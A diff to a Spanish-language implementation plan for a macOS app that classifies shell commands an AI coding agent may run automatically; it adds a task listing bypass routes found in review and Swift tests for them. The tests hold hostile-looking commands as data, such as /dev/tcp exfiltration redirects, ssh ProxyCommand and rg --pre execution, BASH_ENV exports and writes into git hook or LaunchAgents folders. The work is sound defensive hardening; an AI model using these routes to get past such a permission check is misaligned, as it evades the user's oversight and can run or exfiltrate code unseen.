@@ -1120,6 +1120,121 @@ git commit -m "La regla entiende git, gh, ssh, sed, awk, find y xargs por lo que
 
 ---
 
+### Tarea 5b: correcciones a la regla (de la revisión del bloque 2)
+
+Salieron al pasar a la regla comandos tramposos que no estaban en el plan. Todos se colaban como "pasa":
+- **Carpeta protegida nombrada entera.** `cp -r evil .husky`, `mv x .githooks` y `cp -t ~/Library/LaunchAgents x.plist`: los patrones solo cubrían lo que está *dentro* de la carpeta.
+- **Lectura que ejecuta por una opción.** `rg --pre=…`, `sort --compress-program=…`, `bat --pager=…`, `less '+!…'`, `man -P …`, `ssh -o ProxyCommand=…` y `git fetch --upload-pack=…`.
+- **Escrituras a rutas que no se ven en el comando.** `tar x`, `unzip`, `patch`, `git apply` y `git am` pueden escribir cualquier ruta, incluso `.git/hooks`.
+- **Red escondida en una redirección.** `> /dev/tcp/host/puerto` y `/dev/udp/…` sacan datos de la máquina.
+- **Variables que cambian lo que corre después.** `export BASH_ENV=…`, `ENV=…`, `ZDOTDIR=…` y `PROMPT_COMMAND=…`.
+- **`timeout` con opciones que llevan valor** (`-s KILL`): se tomaba `KILL` como la duración. No dejaba pasar nada, pero clasificaba mal.
+
+**Archivos:**
+- Modificar: `Sources/BuddyCore/Rule/PathPolicy.swift`, `Sources/BuddyCore/Rule/CommandCatalog.swift`, `Sources/BuddyCore/Rule/ShellRule.swift` y `Sources/BuddyCore/Rule/ShellRule+Commands.swift`
+- Test: `Tests/ClaudeMenuBarBuddyTests/PathPolicyTests.swift` y `Tests/ClaudeMenuBarBuddyTests/ShellRuleCommandsTests.swift` (agregar al final de cada suite)
+
+**Interfaces:** sin cambios públicos.
+
+- [ ] **Paso 1: agregar los tests**
+
+En `PathPolicyTests`:
+
+```swift
+    @Test(arguments: [
+        "/Users/u/.ssh", "/Users/u/.gnupg", "/Users/u/Library/LaunchAgents", "/Library/LaunchDaemons",
+        "/tmp/p/.claude", "/Users/u/.config/claude-menubar-buddy", "/Users/u/.oh-my-zsh", "/Users/u/.config/fish",
+        "/tmp/p/.vscode", "/Users/u/.config/git", "/Users/u/.config/opencode", "/tmp/p/.opencode",
+        "/tmp/p/.husky", "/tmp/p/.githooks", "/tmp/p/.HUSKY",
+    ])
+    func protectedDirectoriesThemselves(path: String) {
+        #expect(policy.isProtected(path), "the directory itself must be protected: \(path)")
+    }
+
+    @Test(arguments: ["/tmp/p/sshkeys-docs", "/tmp/p/husky-notes.md", "/tmp/p/src/opencode-client.ts", "/tmp/p/claude.md"])
+    func lookAlikesAreNotProtected(path: String) {
+        #expect(!policy.isProtected(path))
+    }
+```
+
+En `ShellRuleCommandsTests`:
+
+```swift
+    @Test(arguments: [
+        ("cp -t ~/Library/LaunchAgents x.plist", RuleCategory.rutaProtegida), ("cp -r evil-hooks .husky", .rutaProtegida),
+        ("mv evil .githooks", .rutaProtegida), ("cp x ~/Library/LaunchAgents/", .rutaProtegida),
+        ("ssh -o ProxyCommand='sh -c x' h 'ls'", .ejecuta), ("ssh -oProxyCommand=evil h ls", .ejecuta),
+        ("ssh -o LocalCommand=x -o PermitLocalCommand=yes h ls", .ejecuta), ("ssh -F ./cfg h ls", .ejecuta),
+        ("git fetch --upload-pack='sh -c x' origin", .ejecuta), ("git clone -u 'sh -c x' https://x/y", .ejecuta),
+        ("git push --receive-pack=x origin", .ejecuta), ("git apply evil.patch", .desconocido), ("git am x.mbox", .desconocido),
+        ("rg -n foo --pre=./evil.sh .", .ejecuta), ("rg -n foo --pre ./evil.sh .", .ejecuta),
+        ("sort --compress-program=sh a", .ejecuta), ("bat --pager='sh -c x' f", .ejecuta),
+        ("zip -TT 'sh -c x' a.zip f", .ejecuta), ("less '+!rm -rf x' f", .desconocido), ("man -P 'sh -c x' ls", .desconocido),
+        ("more f", .desconocido), ("tar xf evil.tar", .desconocido), ("tar -cf x.tar --to-command='sh -c x' .", .desconocido),
+        ("unzip evil.zip", .desconocido), ("patch -p1 < evil.patch", .desconocido),
+        ("printf x > /dev/tcp/1.2.3.4/80", .sale), ("cat a < /dev/udp/1.2.3.4/53", .sale),
+        ("export BASH_ENV=/tmp/evil.sh", .ejecuta), ("BASH_ENV=/tmp/x git commit -m y", .ejecuta),
+        ("export ZDOTDIR=/tmp/z", .ejecuta), ("PROMPT_COMMAND=x ls", .ejecuta),
+        ("timeout -s KILL 5 python3 x", .ejecuta), ("timeout --kill-after=2 5 grep x f", .lectura),
+    ])
+    func reviewOfBlockTwo(command: String, expected: RuleCategory) {
+        #expect(category(command) == expected, "\(command)")
+    }
+
+    @Test(arguments: ["rg -n foo src", "sort -u a.txt", "ls -la ~/.ssh", "zip -r out.zip src", "git log -p -3", "bat a.txt"])
+    func reviewOfBlockTwoStillPasses(command: String) {
+        #expect(ShellRule.assess(command, context: ruleContext).category.passesInAutoMode, "should pass: \(command)")
+    }
+```
+
+- [ ] **Paso 2: verificar que fallan**
+
+Corre: `swift build && swift test --filter "PathPolicyTests|ShellRuleCommandsTests"`
+Esperado: FALLAN los casos nuevos.
+
+- [ ] **Paso 3: corregir**
+
+- **`PathPolicy.swift`:** a los patrones protegidos agrega la carpeta misma de cada patrón de carpeta:
+  ```
+  */.ssh  */.gnupg  */Library/LaunchAgents  */Library/LaunchDaemons  */.claude  ~/.config/claude-menubar-buddy
+  */.oh-my-zsh  */.config/fish  */.vscode  */.config/git  ~/.config/opencode  */.opencode  */.husky  */.githooks
+  ```
+  Con eso, `cp x ~/Library/LaunchAgents/` y `cp -t DIR` quedan cubiertos sin más código: el destino es la carpeta protegida.
+- **`CommandCatalog.swift`:**
+  - quita `less`, `more` y `man` de `read`;
+  - quita `tar`, `unzip` y `patch` de `localChange`;
+  - los seis caen en desconocido.
+- **`ShellRule.swift`:**
+  - **Nombres peligrosos:** son `PATH`, `BASH_ENV`, `ENV`, `ZDOTDIR`, `PROMPT_COMMAND` y los que empiezan con `DYLD_`, `LD_` o `GIT_`. Se revisan igual en las asignaciones delante del comando que en `export`/`declare`/`typeset`/`local`/`readonly`, con el mismo motivo `cambia cómo se resuelve el comando: NOMBRE=`.
+  - **Red en una redirección:** un destino de cualquier redirección `write`, `append` o `read` que empiece con `/dev/tcp/` o `/dev/udp/` da sale, con el motivo `abre una conexión de red: DESTINO`.
+  - **Envoltura `timeout`:** consume `-s`, `-k`, `--signal` y `--kill-after` con su valor, separado o pegado con `=`, más los booleanos `--preserve-status`, `--foreground` y `-v`. Luego viene la duración.
+- **`ShellRule+Commands.swift`,** antes de clasificar por nombre: opciones que ejecutan. Si alguna palabra es igual a la opción o empieza con `opción=`, da ejecuta con el motivo `ejecuta código a través de una opción: OPCIÓN`.
+
+  | Comando | Opciones |
+  |---|---|
+  | `rg` | `--pre` |
+  | `sort` | `--compress-program` |
+  | `bat` | `--pager` |
+  | `zip` | `-TT`, `--unzip-command` |
+  | `git` (cualquier subcomando, antes de la tabla de subcomandos) | `--upload-pack`, `--receive-pack`, `--exec`; y `-u` cuando el subcomando es `clone`, `fetch`, `pull`, `ls-remote` o `archive` |
+  | `ssh` | `-F`; y `-o` cuyo valor (separado, o pegado como `-oX`) contenga, sin distinguir mayúsculas, `proxycommand`, `localcommand`, `permitlocalcommand` o `knownhostscommand` |
+
+  En la tabla de subcomandos de `git`, quita `apply` y `am` de cambioLocal: caen en desconocido.
+
+- [ ] **Paso 4: verificar que pasa todo**
+
+Corre: `swift build && swift test`
+Esperado: todo en verde, incluidas las pruebas de las tareas 4 y 5 que ya pasaban.
+
+- [ ] **Paso 5: commit**
+
+```bash
+git add Sources/BuddyCore/Rule/ Tests/ClaudeMenuBarBuddyTests/PathPolicyTests.swift Tests/ClaudeMenuBarBuddyTests/ShellRuleCommandsTests.swift
+git commit -m "La regla cierra las vías que ejecutan o escriben por una opción, la red por /dev/tcp y las carpetas protegidas nombradas enteras"
+```
+
+---
+
 ### Tarea 6: regla por herramienta y política del modo auto
 
 **Archivos:**
